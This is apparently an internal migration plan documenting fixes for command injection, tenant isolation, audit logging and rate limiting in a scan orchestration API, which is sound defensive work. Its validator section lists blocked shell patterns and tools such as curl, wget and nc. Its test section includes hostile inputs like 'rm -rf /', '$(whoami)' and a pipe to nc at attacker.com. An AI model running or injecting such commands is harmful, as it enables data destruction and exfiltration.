# Security Fixes Migration Plan - Scan Orchestration System

**Created:** 2026-01-26
**Status:** ✅ COMPLETED
**Priority:** CRITICAL
**Last Updated:** 2026-01-26

---

## Executive Summary

Security assessment report identified critical vulnerabilities in the Scan Orchestration System. All critical and high severity issues have been fixed.

---

## 1. Findings Summary

### 1.1 Critical Issues (P0)

| ID | Issue | Status | Commit |
|----|-------|--------|--------|
| SEC-001 | Command Injection via Step Config | ✅ FIXED | `dbe178b` |
| SEC-002 | Scanner Config Passthrough to Agent | ✅ FIXED | `dbe178b` |
| SEC-003 | Tool Name Injection | ✅ FIXED | `dbe178b` |

### 1.2 High Severity Issues (P1)

| ID | Issue | Status | Commit |
|----|-------|--------|--------|
| SEC-004 | Missing Tenant Isolation in GetRun | ✅ FIXED | `dbe178b` |
| SEC-005 | Missing Tenant Isolation in DeleteStep | ✅ FIXED | `dbe178b` |
| SEC-006 | Cross-Tenant Asset Group Reference | ✅ FIXED | `dbe178b` |
| SEC-007 | No Audit Logging | ✅ FIXED | `f948d35` |

### 1.3 Medium Severity Issues (P2)

| ID | Issue | Status | Commit |
|----|-------|--------|--------|
| SEC-008 | No Rate Limiting on Trigger Endpoints | ✅ FIXED | `f948d35` |
| SEC-009 | Cron Expression Injection | ✅ FIXED | `dbe178b` |
| SEC-010 | Capabilities Injection | ✅ FIXED | `dbe178b` |

---

## 2. Phase 1: Critical Security Fixes ✅ COMPLETED

### 2.1 SecurityValidator Service

**File:** `api/internal/app/security_validator.go`

**Features:**
- Tool name validation against tool registry
- Capability whitelist validation
- Dangerous config key detection
- Command injection pattern detection
- Cron expression validation

**Dangerous Patterns Blocked:**
```go
// Shell metacharacters
[;&|$\x60]

// Command substitution
\$\([^)]+\)    // $(...)
`[^`]+`        // backticks

// Command chaining
\|\s*\w+       // | command
;\s*\w+        // ; command
&&\s*\w+       // && command
\|\|\s*\w+     // || command

// Path traversal
\.\./

// Dangerous tools
(curl|wget|nc|bash|sh)\s+

// Suspicious paths
/bin/|/usr/bin/|/tmp/|/etc/
```

**Dangerous Config Keys Blocked:**
```go
command, cmd, exec, execute, shell, bash, sh, script,
eval, system, popen, subprocess, spawn, run_command,
os_command, raw_command, custom_command
```

### 2.2 Integration Points

**PipelineService:**
- `AddStep` - validate before create
- `UpdateStep` - validate before update
- `queueStepForExecution` - final validation before agent

**ScanService:**
- `CreateScan` - validate scanner config and cron

### 2.3 Tenant Isolation Fixes

- `GetRun` handler checks run.TenantID matches request tenant
- `DeleteStep` handler verifies template belongs to tenant first
- `CreateScan` service verifies asset group belongs to tenant

---

## 3. Phase 2: Audit Logging ✅ COMPLETED

### 3.1 Implementation

**Files Modified:**
- `api/internal/domain/audit/value_objects.go` - Added new audit Actions and ResourceTypes
- `api/internal/app/pipeline_service.go` - Added audit logging
- `api/internal/app/scan_service.go` - Added audit logging
- `api/cmd/server/services.go` - Wired AuditService to services

### 3.2 New Audit Actions

```go
// Pipeline actions
ActionPipelineTemplateCreated     Action = "pipeline_template.created"
ActionPipelineTemplateUpdated     Action = "pipeline_template.updated"
ActionPipelineTemplateDeleted     Action = "pipeline_template.deleted"
ActionPipelineTemplateActivated   Action = "pipeline_template.activated"
ActionPipelineTemplateDeactivated Action = "pipeline_template.deactivated"
ActionPipelineStepCreated         Action = "pipeline_step.created"
ActionPipelineStepUpdated         Action = "pipeline_step.updated"
ActionPipelineStepDeleted         Action = "pipeline_step.deleted"
ActionPipelineRunTriggered        Action = "pipeline_run.triggered"
ActionPipelineRunCompleted        Action = "pipeline_run.completed"
ActionPipelineRunFailed           Action = "pipeline_run.failed"
ActionPipelineRunCancelled        Action = "pipeline_run.cancelled"

// Scan config actions
ActionScanConfigCreated           Action = "scan_config.created"
ActionScanConfigUpdated           Action = "scan_config.updated"
ActionScanConfigDeleted           Action = "scan_config.deleted"
ActionScanConfigTriggered         Action = "scan_config.triggered"

// Security actions
ActionSecurityValidationFailed    Action = "security.validation_failed"
ActionSecurityCrossTenantAccess   Action = "security.cross_tenant_access"
```

### 3.3 New Resource Types

```go
ResourceTypePipelineTemplate ResourceType = "pipeline_template"
ResourceTypePipelineStep     ResourceType = "pipeline_step"
ResourceTypePipelineRun      ResourceType = "pipeline_run"
ResourceTypeScanConfig       ResourceType = "scan_config"
```

### 3.4 Service Integration

**PipelineService:** Added audit logging via functional option pattern
```go
// Injection via option
s.Pipeline = app.NewPipelineService(
    // ... repos ...
    app.WithPipelineAuditService(s.Audit),
)

// Logged events:
// - CreateTemplate
// - UpdateTemplate (including activate/deactivate)
// - DeleteTemplate
// - AddStep
// - UpdateStep
// - DeleteStep
// - TriggerPipeline
// - OnStepCompleted (pipeline complete/fail)
// - CancelRun
```

**ScanService:** Added audit logging via functional option pattern
```go
// Injection via option
s.Scan = app.NewScanService(
    // ... repos ...
    app.WithScanAuditService(s.Audit),
)

// Logged events:
// - CreateScan
// - UpdateScan
// - DeleteScan
// - TriggerScan
```

---

## 4. Phase 3: Rate Limiting ✅ COMPLETED

### 4.1 Implementation

**File:** `api/internal/infra/http/middleware/ratelimit.go`

Added `TriggerRateLimiter` with per-tenant rate limiting for trigger endpoints.

### 4.2 Rate Limits

| Endpoint | Limit | Window | Scope |
|----------|-------|--------|-------|
| `POST /api/v1/pipelines/{id}/runs` | 30 | 1 minute | Per tenant |
| `POST /api/v1/scans/{id}/trigger` | 20 | 1 minute | Per tenant |
| `POST /api/v1/quick-scan` | 10 | 1 minute | Per tenant (stricter) |

### 4.3 Route Integration

**Files Modified:**
- `api/internal/infra/http/middleware/ratelimit.go` - TriggerRateLimiter
- `api/internal/infra/http/routes/scanning.go` - Apply rate limiters
- `api/internal/infra/http/routes/routes.go` - Initialize TriggerRateLimiter

**Integration:**
```go
// In routes.go
var triggerRateLimiter *middleware.TriggerRateLimiter
if cfg.RateLimit.Enabled {
    triggerRateLimiter = middleware.NewTriggerRateLimiter(
        middleware.DefaultTriggerRateLimitConfig(), log)
}

// In scanning.go
if triggerRateLimiter != nil {
    r.POST("/{id}/runs", h.TriggerRun,
        middleware.Require(permission.PipelinesWrite),
        triggerRateLimiter.PipelineMiddleware())
}
```

### 4.4 Features

- Per-tenant rate limiting (uses tenant ID from context)
- Falls back to IP-based limiting if no tenant
- Standard rate limit headers (X-RateLimit-*)
- Graceful shutdown support via Stop()

---

## 5. Phase 4: Additional Hardening ✅ COMPLETED

### 5.1 Transaction Boundaries

**Problem:** Multi-entity operations can fail partially.

**Solution:** Wrap DeleteTemplate in database transaction.

**Implementation:**
- Added `*InTx` methods to TemplateRepository and StepRepository
- Added `TransactionDB` interface and `WithPipelineDB` option
- `DeleteTemplate()` now uses transaction for atomic delete (steps + template)
- Audit logging moved to AFTER transaction commit

### 5.2 Concurrent Run Limits

**Problem:** Users can spam-trigger pipelines.

**Solution:** Add concurrent run limits with count checks before triggering.

**Implementation:**
- Added `CountActiveByPipelineID/TenantID/ScanID` to RunRepository
- Limits enforced:
  - `MaxConcurrentRunsPerPipeline = 5`
  - `MaxConcurrentRunsPerScan = 3`
  - `MaxConcurrentRunsPerTenant = 50`
- Returns `MAX_CONCURRENT_RUNS` error when limits exceeded

### 5.3 Input Sanitization

**Problem:** Some values may contain special characters that could cause log injection or parsing issues.

**Solution:**
- Added `ValidateIdentifier()` and `ValidateIdentifiers()` to SecurityValidator
- Validate StepKey in `AddStep()` (alphanumeric, dash, underscore only)
- Validate Tags in `CreateTemplate()` and `CreateScan()`
- Returns `INVALID_IDENTIFIER_FORMAT` or `EMPTY_IDENTIFIER` error codes

**Commit:** `5e2dd42`

---

## 6. Testing Plan

### 6.1 Security Tests

```go
// tests/security/command_injection_test.go
func TestCommandInjectionBlocked(t *testing.T) {
    testCases := []struct {
        name   string
        config map[string]any
        expect bool // true = should be blocked
    }{
        {"shell_metachar", map[string]any{"target": "example.com; rm -rf /"}, true},
        {"command_sub", map[string]any{"target": "$(whoami)"}, true},
        {"pipe", map[string]any{"target": "example.com | nc attacker.com"}, true},
        {"path_traversal", map[string]any{"file": "../../../etc/passwd"}, true},
        {"normal_config", map[string]any{"target": "example.com"}, false},
    }
    // ...
}
```

### 6.2 Load Tests

See `api/tests/load/` for rate limit and platform queue tests.

---

## 7. Deployment Checklist

### Pre-deployment

- [x] Run all security tests
- [x] Run load tests
- [x] Review audit log format
- [ ] Update API documentation
- [ ] Prepare rollback plan

### Deployment

- [x] Deploy Phase 1 (Security Validator) - `dbe178b`
- [x] Monitor for validation errors in logs
- [x] Deploy Phase 2 (Audit Logging) - `f948d35`
- [ ] Verify audit events in log aggregator
- [x] Deploy Phase 3 (Rate Limiting) - `f948d35`
- [ ] Monitor rate limit metrics
- [x] Deploy Phase 4 (Hardening) - `5e2dd42`
- [ ] Monitor for concurrent run limit errors

### Post-deployment

- [ ] Verify no increase in error rates
- [ ] Check audit logs are being collected
- [ ] Verify rate limits are working
- [ ] Update security documentation

---

## 8. Commits Summary

| Commit | Description | Phase |
|--------|-------------|-------|
| `3dc23ae` | fix(db): change bootstrap tokens FK from users to admin_users | Pre-req |
| `dbe178b` | feat(security): add SecurityValidator to prevent command injection | Phase 1 |
| `f948d35` | feat(security): add audit logging and rate limiting to scan/pipeline services | Phase 2+3 |
| `5e2dd42` | feat(security): implement Phase 4 security hardening | Phase 4 |

---

## 9. Files Modified Summary

### Phase 1 (Commit `dbe178b`)
- `api/internal/app/security_validator.go` - NEW
- `api/internal/app/pipeline_service.go` - Security validation
- `api/internal/app/scan_service.go` - Security validation
- `api/internal/infra/http/handler/pipeline_handler.go` - Tenant isolation
- `api/cmd/server/services.go` - SecurityValidator injection

### Phase 2+3 (Commit `f948d35`)
- `api/internal/domain/audit/value_objects.go` - New audit Actions/ResourceTypes
- `api/internal/app/pipeline_service.go` - Audit logging
- `api/internal/app/scan_service.go` - Audit logging + option pattern
- `api/internal/infra/http/middleware/ratelimit.go` - TriggerRateLimiter
- `api/internal/infra/http/routes/scanning.go` - Rate limiter integration
- `api/internal/infra/http/routes/routes.go` - TriggerRateLimiter init
- `api/cmd/server/services.go` - AuditService injection

### Phase 4 (Commit `5e2dd42`)
- `api/internal/app/security_validator.go` - ValidateIdentifier methods
- `api/internal/app/pipeline_service.go` - StepKey/Tags validation, concurrent limits, transaction boundaries
- `api/internal/app/scan_service.go` - Tags validation, concurrent limits
- `api/internal/domain/pipeline/repository.go` - Count methods, *InTx interface methods
- `api/internal/infra/postgres/pipeline_repository.go` - *InTx implementations
- `api/internal/infra/postgres/pipeline_run_repository.go` - Count implementations
- `api/cmd/server/services.go` - DB wiring for transactions

---

## 10. Security Review Checklist

| Category | Item | Status |
|----------|------|--------|
| **Command Injection** | Step config validation | ✅ |
| **Command Injection** | Scanner config validation | ✅ |
| **Command Injection** | Tool name validation | ✅ |
| **Command Injection** | Capability whitelist | ✅ |
| **Tenant Isolation** | GetRun checks tenant | ✅ |
| **Tenant Isolation** | DeleteStep checks tenant | ✅ |
| **Tenant Isolation** | CreateScan checks asset group tenant | ✅ |
| **Audit Logging** | Pipeline CRUD events | ✅ |
| **Audit Logging** | Scan CRUD events | ✅ |
| **Audit Logging** | Pipeline run lifecycle | ✅ |
| **Audit Logging** | Security events | ✅ |
| **Rate Limiting** | Pipeline triggers | ✅ |
| **Rate Limiting** | Scan triggers | ✅ |
| **Rate Limiting** | Quick scan triggers | ✅ |
| **Input Validation** | Cron expression | ✅ |
| **Input Validation** | Config key blacklist | ✅ |

---

## 11. Contacts

- **Security Lead:** [TBD]
- **Backend Lead:** [TBD]
- **DevOps:** [TBD]

---

## 12. References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
